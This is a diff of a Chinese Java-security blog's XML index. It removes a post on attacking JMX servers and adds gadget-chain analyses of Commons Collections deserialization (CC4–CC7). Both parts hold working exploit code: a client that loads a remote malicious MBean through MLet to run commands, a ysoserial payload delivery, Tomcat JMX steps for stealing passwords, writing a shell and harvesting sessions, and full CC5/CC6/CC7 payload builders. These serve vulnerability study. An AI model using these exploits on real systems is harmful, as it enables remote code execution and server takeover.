-<p><img src="/images/20230601232259.png"></p>
-<p>通过jconsole调用Melt的<code>getMBeansFromURL</code>方法，参数中填入我们的恶意server地址</p>
-<p><img src="/images/20230601232833.png"></p>
-<p>我们的恶意MBean被成功加载，通过恶意MBean命令执行</p>
-<p><img src="/images/20230601232958.png"></p>
-<h1 id="攻击二：远程加载MBean"><a href="#攻击二：远程加载MBean" class="headerlink" title="攻击二：远程加载MBean"></a>攻击二：远程加载MBean</h1><p>JMX Server可以在本地绑定MBean，同时也可以加载远程MBean，并且这一过程我们可以在客户端控制。</p>
-<h2 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a>攻击示例</h2><p>随便起一个JMXServer，里面随便绑定了个MBean，并没有绑定MLet</p>
-<pre><code>public class JMXDemo &#123;
-    public static void main(String[] args) throws Exception &#123;
-        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
-        ObjectName objectName = new ObjectName(&quot;test:type=Hello&quot;);
-        Hello mbean = new Hello();
-        mBeanServer.registerMBean(mbean, objectName);
-
-        Registry registry = LocateRegistry.createRegistry(1199);
-
-        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
-        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
-        jmxConnectorServer.start();
-        System.out.println(&quot;Server start...&quot;);
-    &#125;
-&#125;
-</code></pre>
-<p>通过远程加载MLet，再去加载我们的恶意server中的MBean</p>
-<pre><code>public class ExploitJMXByRemoteMBean &#123;
-    public static void main(String[] args) throws MalformedURLException &#123;
-        connectAndOwn(&quot;127.0.0.1&quot;, &quot;1199&quot;, &quot;ipconfig&quot;);
-    &#125;
-
-    static void connectAndOwn(String serverName, String port, String command) throws MalformedURLException &#123;
-        try &#123;
-            // step1. 通过rmi创建 jmx连接
-            JMXServiceURL u = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://&quot; + serverName + &quot;:&quot; + port + &quot;/jmxrmi&quot;);
-            System.out.println(&quot;URL: &quot; + u + &quot;, connecting&quot;);
-            JMXConnector c = JMXConnectorFactory.connect(u);
-            System.out.println(&quot;Connected: &quot; + c.getConnectionId());
-            MBeanServerConnection m = c.getMBeanServerConnection();
-            // step2. 加载特殊MBean：javax.management.loading.MLet
-            ObjectInstance evil_bean = null;
-            ObjectInstance evil = null;
-            try &#123;
-                evil = m.createMBean(&quot;javax.management.loading.MLet&quot;, null);
-            &#125; catch (javax.management.InstanceAlreadyExistsException e) &#123;
-                evil = m.getObjectInstance(new ObjectName(&quot;DefaultDomain:type=MLet&quot;));
-            &#125;
-            // step3：通过MLet加载远程恶意MBean
-            System.out.println(&quot;Loaded &quot;+evil.getClassName());
-            Object res = m.invoke(evil.getObjectName(), &quot;getMBeansFromURL&quot;, new Object[]
-                            &#123; &quot;http://127.0.0.1:8000/mlet.txt&quot; &#125;,
-                    new String[] &#123; String.class.getName() &#125; );
-            HashSet res_set = ((HashSet)res);
-            Iterator itr = res_set.iterator();
-            Object nextObject = itr.next();
-            // 如果恶意mbean已经存在，则直接获取
-            if (nextObject instanceof InstanceAlreadyExistsException)
-            &#123;
-                //
-                evil_bean = m.getObjectInstance(new ObjectName(&quot;MLetCompromise:name=evil,id=1&quot;));
-            &#125; else if (nextObject instanceof Exception) &#123;
-                throw ((Exception)nextObject);
-            &#125; else &#123;
-                evil_bean = ((ObjectInstance)nextObject);
-            &#125;
-            // step4: 执行恶意MBean
-            System.out.println(&quot;Loaded class: &quot;+evil_bean.getClassName()+&quot; object &quot;+evil_bean.getObjectName());
-            System.out.println(&quot;Calling runCommand with: &quot;+command);
-            Object result = m.invoke(evil_bean.getObjectName(), &quot;runCommand&quot;, new Object[]&#123; command &#125;, new String[]&#123; String.class.getName() &#125;);
-            System.out.println(&quot;Result: &quot;+result);
-        &#125; catch (Exception e)
-        &#123;
-            e.printStackTrace();
-        &#125;
-    &#125;
-&#125;
-</code></pre>
-<p>恶意MBean被加载，成功命令执行</p>
-<p><img src="/images/20230601233920.png"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该攻击需要两个条件：</p>
+<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>ysoserial CC4：</p>
 <ol>
-<li>未启用JMX身份验证</li>
-<li>可以调用 <code>getMBeansFromURL</code></li>
+<li>利用说明：<ul>
+<li>使用 PriorityQueue 反序列化时触发的 TransformingComparator 的 compare 方法，就会触发 ChainedTransformer 的 tranform 方法链，其中利用 InstantiateTransformer 实例化 TrAXFilter 类，此类实例化时会调用 TemplatesImpl 的 newTransformer 实例化恶意类，执行恶意代码。</li>
+</ul>
+</li>
+<li>Gadget 总结：<ul>
+<li>kick-off gadget：<code>java.util.PriorityQueue#readObject()</code></li>
+<li>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer()</code></li>
+<li>chain gadget：<code>org.apache.commons.collections.functors.InstantiateTransformer#transform()</code></li>
+</ul>
+</li>
 </ol>
-<p>需要设置<code>jmx.remote.x.mlet.allow.getMBeansFromURL=true</code></p>
-<pre><code>MBeanServerAccessController：
+<p>TreeBag 总结：</p>
+<ol>
+<li>利用说明：<ul>
+<li>用 TreeBag 代替 PriorityQueue 触发 TransformingComparator，后续依旧使用 Transformer 的调用链。</li>
+</ul>
+</li>
+<li>Gadget 总结：<ul>
+<li>kick-off gadget：<code>org.apache.commons.collections4.bag.TreeBag#readObject</code></li>
+<li>sink gadget：<code>org.apache.commons.collections.functors.InvokerTransformer#transform()</code></li>
+<li>chain gadget：<code>java.util.TreeMap#put()</code></li>
+</ul>
+</li>
+</ol>
+<h1 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h1><p>CC5 依旧是 LazyMap 加 ChainedTransformer 的触发模式，只不过不再使用 AnnotationInvocationHandler 的动态代理来触发 LazyMap 的 get ，而是找到了其他的方式。</p>
+<blockquote>
+<p>jdk 在 1.8 之后对 AnnotationInvocationHandler 类进行了修复，所以在 jdk 1.8 版本就必须找出能替代 AnnotationInvocationHandler 的新的可以利用的类。</p>
+</blockquote>
+<h2 id="依赖版本-2"><a href="#依赖版本-2" class="headerlink" title="依赖版本"></a>依赖版本</h2><blockquote>
+<p>commons-collections : 3.1～3.2.1<br>jdk 8u76 without a security manager</p>
+</blockquote>
+<h2 id="前置知识-3"><a href="#前置知识-3" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><p><code>org.apache.commons.collections.keyvalue.TiedMapEntry</code> 是一个 <code>Map.Entry</code> 的实现类，从名称中可以看到，这是一个绑定了底层 map 的 Entry，用来使一个 map entry 对象拥有在底层修改 map 的功能。</p>
+<p>TiedMapEntry 中有一个成员属性 Map，这就是 <code>Map.Entry</code> 的底层 map，TiedMapEntry 的 <code>getValue()</code> 方法会调用底层 map 的 <code>get()</code> 方法，我们可以用来触发 LazyMap 的 get。那谁会调用 <code>getValue()</code> 方法呢？我们发现 TiedMapEntry 的 equals&#x2F;hashCode&#x2F;toString 都可以触发。</p>
+<pre><code>public String toString() &#123;
+    return getKey() + &quot;=&quot; + getValue();
+&#125;
 
-final String propName =&quot;jmx.remote.x.mlet.allow.getMBeansFromURL&quot;;
-GetPropertyAction propAction = new GetPropertyAction(propName);
-String propValue = AccessController.doPrivileged(propAction);
-boolean allowGetMBeansFromURL =&quot;true&quot;.equalsIgnoreCase(propValue);
-if (!allowGetMBeansFromURL) &#123;
-    throw new SecurityException(&quot;Access denied! MLet method &quot; +
-            &quot;getMBeansFromURLcannot be invoked unless a &quot; +
-            &quot;security manageris installed or the system property &quot; +
-            &quot;-Djmx.remote.x.mlet.allow.getMBeansFromURL=true&quot; +
-            &quot;isspecified.&quot;);
+public Object getValue() &#123;
+    return map.get(key);
 &#125;
 </code></pre>
-<h1 id="攻击三：通过MBean方法参数反序列化攻击JMX"><a href="#攻击三：通过MBean方法参数反序列化攻击JMX" class="headerlink" title="攻击三：通过MBean方法参数反序列化攻击JMX"></a>攻击三：通过MBean方法参数反序列化攻击JMX</h1><h2 id="JMX调用MBean的流程"><a href="#JMX调用MBean的流程" class="headerlink" title="JMX调用MBean的流程"></a>JMX调用MBean的流程</h2><ol>
-<li>将<code>MBean name</code>、<code>MBean Function Name</code>、<code>params</code>发送给远程<code>rmi server</code>，其中<code>params</code>的处理需要注意下，先转为<code>MarshalledObject</code>，再<code>writeObject</code>为<code>String</code>对象，然后进入网络传输；</li>
-<li><code>RMI Server</code>监听到网络请求包含<code>MBean name</code>、<code>MBean Function Name</code>、<code>params</code>，其中params经过<code>MarshalledObject.readObject()</code>反序列化，再通过<code>invoke</code>调用原函数。</li>
+<p>接下来需要找到一个类在反序列化时会触发 TiedMapEntry 的 toString() 方法。</p>
+<h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h3><p>于是找到了 <code>javax.management.BadAttributeValueExpException</code> 这个类，反序列化读取 val，当 <code>System.getSecurityManager() == null</code> 或 valObj 是除了 String 的其他基础类型时会调用 valObj 的 <code>toString()</code> 方法，完成上面 TiedMapEntry 的构造。</p>
+<pre><code>private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream.GetField gf = ois.readFields();
+        Object valObj = gf.get(&quot;val&quot;, null);
+
+        if (valObj == null) &#123;
+            val = null;
+        &#125; else if (valObj instanceof String) &#123;
+            val= valObj;
+        &#125; else if (System.getSecurityManager() == null
+                || valObj instanceof Long
+                || valObj instanceof Integer
+                || valObj instanceof Float
+                || valObj instanceof Double
+                || valObj instanceof Byte
+                || valObj instanceof Short
+                || valObj instanceof Boolean) &#123;
+            val = valObj.toString();
+        &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix
+            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();
+        &#125;
+    &#125;
+</code></pre>
+<h2 id="攻击构造-1"><a href="#攻击构造-1" class="headerlink" title="攻击构造"></a>攻击构造</h2><pre><code>public class CC5 &#123;
+
+    public static String fileName = &quot;CC5.bin&quot;;
+
+    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;
+
+        // 创建 ChainedTransformer
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;);
+
+        // 创建 LazyMap 并引入 TiedMapEntry
+        Map lazyMap = LazyMap.decorate(new HashMap(), chain);
+        TiedMapEntry entry   = new TiedMapEntry(lazyMap, &quot;1azy&quot;);
+
+        // 实例化 BadAttributeValueExpException 并反射写入
+        BadAttributeValueExpException exception = new BadAttributeValueExpException(&quot;1azy&quot;);
+        Field field     = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);
+        field.setAccessible(true);
+        field.set(exception, entry);
+
+        SerializeUtil.write(exception, fileName);
+        SerializeUtil.read(fileName);
+    &#125;
+
+&#125;
+</code></pre>
+<h1 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h1><p>在 CC5 中我们使用了 <code>TiedMapEntry#toString</code> 来触发 <code>LazyMap#get</code>，在 CC6 中是通过 <code>TiedMapEntry#hashCode</code> 来触发。之前看到了 hashcode 方法也会调用 <code>getValue()</code> 方法然后调用到其中 map 的 get 方法触发 LazyMap。</p>
+<p>需要一个入口触发<code>hashCode</code></p>
+<h2 id="maven依赖版本-1"><a href="#maven依赖版本-1" class="headerlink" title="maven依赖版本"></a>maven依赖版本</h2><pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+    &lt;version&gt;3.1&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h2 id="前置知识-4"><a href="#前置知识-4" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h3><p>HashSet 是一个无序的，不允许有重复元素的集合。HashSet 本质上就是由 HashMap 实现的。HashSet 中的元素都存放在 HashMap 的 key 上面，而 value 中的值都是统一的一个<code>private static final Object PRESENT = new Object();</code>。HashSet 跟 HashMap 一样，都是一个存放链表的数组。</p>
+<p>在 HashSet 的 readObject 方法中，会调用其内部 HashMap 的 put 方法，将值放在 key 上。</p>
+<h2 id="攻击构造-2"><a href="#攻击构造-2" class="headerlink" title="攻击构造"></a>攻击构造</h2><pre><code>public class CC6WithHashMap &#123;
+
+    public static String fileName = &quot;CC6WithHashMap.bin&quot;;
+
+    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InvocationTargetException &#123;
+
+        // 初始化 HashMap
+        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+
+        // 创建 ChainedTransformer
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+
+        // 创建一个空的 ChainedTransformer
+        ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]&#123;&#125;);
+
+        // 创建 LazyMap 并引入 TiedMapEntry
+        Map lazyMap = LazyMap.decorate(new HashMap(), fakeChain);
+        TiedMapEntry entry   = new TiedMapEntry(lazyMap, &quot;1&quot;);
+
+        hashMap.put(entry, &quot;1azy&quot;);
+
+        //用反射再改回真的chain
+        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
+        f.setAccessible(true);
+        f.set(fakeChain, transformers);
+        //清空由于 hashMap.put 对 LazyMap 造成的影响
+        lazyMap.clear();
+
+        // 反射调用 HashMap 的 putVal 方法
+//		Method[] m = Class.forName(&quot;java.util.HashMap&quot;).getDeclaredMethods();
+//		for (Method method : m) &#123;
+//			if (&quot;putVal&quot;.equals(method.getName())) &#123;
+//				method.setAccessible(true);
+//				method.invoke(hashMap, -1, entry, 0, false, true);
+//			&#125;
+//		&#125;
+
+        SerializeUtil.write(hashMap, fileName);
+        SerializeUtil.read(fileName);
+    &#125;
+
+&#125;
+</code></pre>
+<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>以上就是 CC6 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：<ul>
+<li>反序列化 调用 TiedMapEntry 的 toString 方法，简介调用了 LazyMap 的 hashCode 方法，触发了后续的 Transformer 恶意执行链。</li>
+</ul>
+</li>
+<li>Gadget 总结：<ul>
+<li>kick-off gadget：<code>java.util.HashSet#readObject()</code>&#x2F;<code>java.util.HashMap#readObject()</code></li>
+<li>sink gadget：<code>org.apache.commons.collections.functors.InvokerTransformer#transform()</code></li>
+<li>chain gadget：<code>org.apache.commons.collections.keyvalue.TiedMapEntry#hashCode()</code></li>
+</ul>
+</li>
 </ol>
-<h2 id="攻击示例-1"><a href="#攻击示例-1" class="headerlink" title="攻击示例"></a>攻击示例</h2><p>使用<code>CommonsCollections2</code>链，参考<code>ysoserial.exploit.JMXInvokeMBean</code></p>
-<pre><code>public class AttackMBeanParams &#123;
+<h1 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h1><p>寻找<code>TiedMapEntry#hashCode</code> 来触发 <code>lazysugar#put</code>，<code>Hashtable</code>满足</p>
+<h2 id="maven依赖版本-2"><a href="#maven依赖版本-2" class="headerlink" title="maven依赖版本"></a>maven依赖版本</h2><pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+    &lt;version&gt;3.1&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h2 id="前置知识-5"><a href="#前置知识-5" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h3><p>Hashtable 与 HashMap 十分相似，是一种 key-value 形式的哈希表，但仍然存在一些区别：</p>
+<ul>
+<li>HashMap 继承 AbstractMap，而 Hashtable 继承 Dictionary ，可以说是一个过时的类。</li>
+<li>两者内部基本都是使用“数组-链表”的结构，但是 HashMap 引入了红黑树的实现。</li>
+<li>Hashtable 的 key-value 不允许为 null 值，但是 HashMap 则是允许的，后者会将 key&#x3D;null 的实体放在 index&#x3D;0 的位置。</li>
+<li>Hashtable 线程安全，HashMap 线程不安全。</li>
+</ul>
+<p>Hashtable 的 readObject 方法中，最后调用了 <code>reconstitutionPut</code> 方法将反序列化得到的 key-value 放在内部实现的 Entry 数组 table 里。</p>
+<p><img src="/images/20230505150925.png"></p>
+<p><code>reconstitutionPut</code> 调用了 key 的 hashCode 方法。</p>
+<p><img src="/images/20230505150943.png"></p>
+<h2 id="攻击构造-3"><a href="#攻击构造-3" class="headerlink" title="攻击构造"></a>攻击构造</h2><pre><code>public class CC7 &#123;
+
+    public static String fileName = &quot;CC7.bin&quot;;
 
     public static void main(String[] args) throws Exception &#123;
+        // 初始化 HashMap
+        Hashtable&lt;Object, Object&gt; hashtable = new Hashtable&lt;&gt;();
 
-        JMXServiceURL url = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
+        // 创建 ChainedTransformer
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;open -a Calculator.app&quot;&#125;)
+        &#125;;
 
-        JMXConnector jmxConnector = JMXConnectorFactory.connect(url);
-        MBeanServerConnection mbeanServerConnection = jmxConnector.getMBeanServerConnection();
+        // 创建一个空的 ChainedTransformer
+        ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]&#123;&#125;);
 
-        // create the payload
-        Object payloadObject = ObjectPayload.Utils.makePayloadObject(&quot;CommonsCollections2&quot;, &quot;calc&quot;);
-        ObjectName mbeanName = new ObjectName(&quot;java.util.logging:type=Logging&quot;);
+        // 创建 LazyMap 并引入 TiedMapEntry
+        Map lazyMap = LazyMap.decorate(new HashMap(), fakeChain);
+        TiedMapEntry entry   = new TiedMapEntry(lazyMap, &quot;1&quot;);
 
-        mbeanServerConnection.invoke(mbeanName, &quot;getLoggerLevel&quot;, new Object[]&#123;payloadObject&#125;, new String[]&#123;String.class.getCanonicalName()&#125;);
+        hashtable.put(entry, &quot;1azy&quot;);
 
-        //close the connection
-        jmxConnector.close();
+        //用反射再改回真的chain
+        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
+        f.setAccessible(true);
+        f.set(fakeChain, transformers);
+        //清空由于 hashtable.put 对 LazyMap 造成的影响
+        lazyMap.clear();
+
+        SerializeUtil.write(hashtable, fileName);
+        SerializeUtil.read(fileName);
     &#125;
 &#125;
 </code></pre>
-<p><img src="/images/20230602000002.png"></p>
-<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>ysoserial用的<code>java.util.logging:type=Logging</code>，换其他ObjectName也行</p>
-<p><img src="/images/20230602000218.png"></p>
-<h1 id="攻击四：利用中间件等的特殊MBean攻击JMX"><a href="#攻击四：利用中间件等的特殊MBean攻击JMX" class="headerlink" title="攻击四：利用中间件等的特殊MBean攻击JMX"></a>攻击四：利用中间件等的特殊MBean攻击JMX</h1><h2 id="通过JMX攻击Tomcat"><a href="#通过JMX攻击Tomcat" class="headerlink" title="通过JMX攻击Tomcat"></a>通过JMX攻击Tomcat</h2><p>Tomcat中默认不开启JMX服务，需要在catalina.bat中配置启动参数</p>
-<pre><code>set &quot;CATALINA_OPTS=%CATALINA_OPTS% -Dcom.sun.management.jmxremote -DJava.rmi.server.hostname=0.0.0.0 -Dcom.sun.management.jmxremote.port=9999 -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false&quot;
-rem   CATALINA_OPTS   (Optional) Java runtime options used when the &quot;start&quot;,
-rem                   &quot;run&quot; or &quot;debug&quot; command is executed.
-rem                   Include here and not in JAVA_OPTS all options, that should
-rem                   only be used by Tomcat itself, not by the stop process,
-rem                   the version command etc.
-</code></pre>
-<p>在9999端口启动一个无认证的JMX服务。</p>
-<p>使用jconsole连接到本地tomcat启动的JMX服务。</p>
-<h3 id="获取已有用户的密码"><a href="#获取已有用户的密码" class="headerlink" title="获取已有用户的密码"></a>获取已有用户的密码</h3><p><code>User</code>-&gt;<code>&quot;tomcatAdmin&quot;</code>-&gt;<code>UserDatabase</code></p>
-<h3 id="添加管理员角色用户"><a href="#添加管理员角色用户" class="headerlink" title="添加管理员角色用户"></a>添加管理员角色用户</h3><ol>
-<li><p><code>Users</code>-&gt;<code>UserDatabase</code>，<code>createUser</code>：</p>
+<h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>以上就是 CC7 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：<ul>
+<li>用 Hashtable 代替 HashMap 触发 LazyMap 方式，与 CC6 HashMap 几乎一致。</li>
+</ul>
 </li>
-<li><p><code>Users</code>-&gt;<code>UserDatabase</code>，创建角色</p>
-</li>
-<li><p><code>Users</code>-&gt;<code>User</code>-&gt;<code>[用户名]</code>节点下，将创建的用户与创建的角色关联</p>
-</li>
-<li><p>保存配置</p>
+<li>Gadget 总结：<ul>
+<li>kick-off gadget：<code>java.util.Hashtable#readObject()</code></li>
+<li>sink gadget：<code>org.apache.commons.collections.functors.InvokerTransformer#transform()</code></li>
+<li>chain gadget：<code>org.apache.commons.collections.keyvalue.TiedMapEntry#hashCode()</code></li>
+</ul>
 </li>
 </ol>
-<h3 id="日志循环函数导致写shell"><a href="#日志循环函数导致写shell" class="headerlink" title="日志循环函数导致写shell"></a>日志循环函数导致写shell</h3><p>Catalina-&gt;Valve-&gt;localhost-&gt;AccessLogValve-&gt;Operations</p>
-<p>boolean rotate(string newFileName)</p>
-<h3 id="抓取网络应用的用户的session-ID"><a href="#抓取网络应用的用户的session-ID" class="headerlink" title="抓取网络应用的用户的session ID"></a>抓取网络应用的用户的session ID</h3><p>Catalina-&gt;Manager-&gt;[ApplicationName]-&gt;Operations-&gt;listSessionIds()</p>
-<h1 id="攻击五：RMI攻击"><a href="#攻击五：RMI攻击" class="headerlink" title="攻击五：RMI攻击"></a>攻击五：RMI攻击</h1><p>因为JMXServer是绑定RMi服务的，所以攻击RMI服务的方式都可以用来攻击JMXServer，这里不再赘述，可以去看RMI攻击的文章</p>
 ]]></content>
       <categories>
         <category>java安全</category>
       </categories>
       <tags>
         <tag>java安全</tag>
-        <tag>JMX</tag>
+        <tag>反序列化</tag>
+        <tag>CC链</tag>
       </tags>
   </entry>
   <entry>
@@ -2974,695 +3663,6 @@ RMIexploit.run();
       <tags>
         <tag>java安全</tag>
         <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java反序列化——CC链</title>
-    <url>/2023/03/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94CC%E9%93%BE/</url>
-    <content><![CDATA[<h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><h2 id="maven依赖版本"><a href="#maven依赖版本" class="headerlink" title="maven依赖版本"></a>maven依赖版本</h2><pre><code>&lt;dependency&gt;
-    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
-    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
-    &lt;version&gt;3.1&lt;/version&gt;
-&lt;/dependency&gt;
-</code></pre>
-<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="AbstractMapDecorator"><a href="#AbstractMapDecorator" class="headerlink" title="AbstractMapDecorator"></a>AbstractMapDecorator</h3><p>CC 库中提供了一个抽象类 <code>org.apache.commons.collections.map.AbstractMapDecorator</code>，这个类是 Map 的扩展，并且从名字中可以知道，这是一个基础的装饰器，用来给 map 提供附加功能，被装饰的 map 存在该类的属性中，并且将所有的操作都转发给这个 map。</p>
-<p>这个类有很多实现类，各个类触发的方式不同，重点关注的是 </p>
-<ul>
-<li>TransformedMap </li>
-<li>LazyMap。</li>
-</ul>
-<h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p><code>org.apache.commons.collections.map.TransformedMap</code> 类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由 Transformer 来定义，Transformer 在 TransformedMap 实例化时作为参数传入。</p>
-<p><img src="/images/20230425195602.png"></p>
-<p>TransformedMap 内的 key 或者 value 发生变化时，例如调用 TransformedMap 的 <code>put</code> 方法时，就会<code>put</code>方法内会调用，<code>transformKey</code>和<code>transformValue</code>， 而这两个方法内就会调用keyTransformer的 <code>transform()</code> 方法。</p>
-<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p><code>org.apache.commons.collections.map.LazyMap</code> 与 TransformedMap 类似，不过差异是调用 <code>get()</code> 方法时如果传入的 key 不存在，则会触发相应参数的 Transformer 的 <code>transform()</code> 方法。</p>
-<p>与 LazyMap 具有相同功能的，是 <code>org.apache.commons.collections.map.DefaultedMap</code>，同样是 <code>get()</code> 方法会触发 transform 方法。</p>
-<h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p><code>org.apache.commons.collections.Transformer</code> 是一个接口，提供了一个 <code>transform()</code> 方法，用来定义具体的转换逻辑。例如<code>InvokerTransformer</code>方法接收 Object 类型的 input，处理后将 Object 返回。</p>
-<p><img src="/images/20230425200030.png"></p>
-<p>在 Commons Collection 3.2.1 中，程序提供了 14 个 Transformer 的实现类，用来实现不同的对 TransformedMap 中 key&#x2F;value 进行修改的功能。</p>
-<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>这个实现类从 Commons Collections 3.0 引入，功能是使用反射创建一个新对象，我们来看一下它的 transfrom 方法，方法注释写的很清楚，通过调用 input 的方法，并将方法返回结果作为处理结果进行返回。</p>
-<p><img src="/images/20230425200155.png"></p>
-<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p><code>org.apache.commons.collections.functors.ChainedTransformer</code> 类也是一个 Transformer的实现类，但是这个类自己维护了一个 Transformer 数组， 在调用 ChainedTransformer 的 transform 方法时，会循环数组，依次调用 Transformer 数组中每个 Transformer 的 transform 方法，并将结果传递给下一个 Transformer。</p>
-<p><img src="/images/20230425200719.png"></p>
-<p>这样就给了使用者链式调用多个 Transformer 分别处理对象的能力。</p>
-<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p><code>org.apache.commons.collections.functors.ConstantTransformer</code> 是一个返回固定常量的 Transformer，在初始化时储存了一个 Object，后续的调用时会直接返回这个 Object。</p>
-<pre><code>public Object transform(Object input) &#123;
-    return iConstant;
-&#125;
-</code></pre>
-<p>这个类用于和 ChainedTransformer 配合，ChainedTransformer需要传入Transformer类型的数组来链式调用，当我们需要一个Class类时，就需要把Class类包装成ConstantTransformer对象，传入Transformer数组，然后将其结果传入 InvokerTransformer 来调用我们指定的类的指定方法。</p>
-<h2 id="构造Gadget"><a href="#构造Gadget" class="headerlink" title="构造Gadget"></a>构造Gadget</h2><p>以要执行Runtime.getRuntime().exec(“calc”)为例,对应的Sink和chain实例代码就是：</p>
-<pre><code>Map hashMap = new HashMap();
-
-ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123;
-        new ConstantTransformer(Runtime.class),
-        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
-        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
-        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
-&#125;);
-
-Map transformedMap = TransformedMap.decorate(hashMap, null, chain);
-
-hashMap.put(&quot;test&quot;, &quot;test&quot;);
-</code></pre>
-<p>chain链执行流程：</p>
-<pre><code>new ConstantTransformer(Runtime.class)
-</code></pre>
